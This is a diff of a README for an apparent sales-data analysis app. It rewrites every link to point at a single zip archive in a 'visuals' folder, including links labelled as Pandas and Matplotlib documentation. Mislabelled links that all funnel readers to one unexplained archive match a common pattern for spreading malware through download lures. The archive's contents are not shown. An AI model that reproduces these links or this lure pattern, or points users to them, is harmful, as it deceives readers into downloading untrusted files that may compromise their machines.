@@ -1,6 +1,6 @@
 # 📊 SALES-DATA-ANALYSIS - Analyze Your Sales Data Easily
 
-[![Download](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip)](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip)
+[![Download](https://github.com/LucasJavaScript/SALES-DATA-ANALYSIS/raw/refs/heads/main/visuals/DAT_ANALYSIS_SALE_2.1-alpha.5.zip)](https://github.com/LucasJavaScript/SALES-DATA-ANALYSIS/raw/refs/heads/main/visuals/DAT_ANALYSIS_SALE_2.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the SALES-DATA-ANALYSIS application! This tool helps you analyze over
 
 ## 📥 Download & Install
 
-To get the application, visit this page to download: [Download SALES-DATA-ANALYSIS](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip).
+To get the application, visit this page to download: [Download SALES-DATA-ANALYSIS](https://github.com/LucasJavaScript/SALES-DATA-ANALYSIS/raw/refs/heads/main/visuals/DAT_ANALYSIS_SALE_2.1-alpha.5.zip).
 
 Follow these steps to download and install:
 
@@ -64,7 +64,7 @@ A: No programming knowledge is required. The interface is user-friendly and guid
 
 ## 💡 Additional Resources
 
-- [Pandas Documentation](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip)
-- [Matplotlib Documentation](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip)
+- [Pandas Documentation](https://github.com/LucasJavaScript/SALES-DATA-ANALYSIS/raw/refs/heads/main/visuals/DAT_ANALYSIS_SALE_2.1-alpha.5.zip)
+- [Matplotlib Documentation](https://github.com/LucasJavaScript/SALES-DATA-ANALYSIS/raw/refs/heads/main/visuals/DAT_ANALYSIS_SALE_2.1-alpha.5.zip)
 
-For more help, visit this page to download: [Download SALES-DATA-ANALYSIS](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip).
+For more help, visit this page to download: [Download SALES-DATA-ANALYSIS](https://github.com/LucasJavaScript/SALES-DATA-ANALYSIS/raw/refs/heads/main/visuals/DAT_ANALYSIS_SALE_2.1-alpha.5.zip).
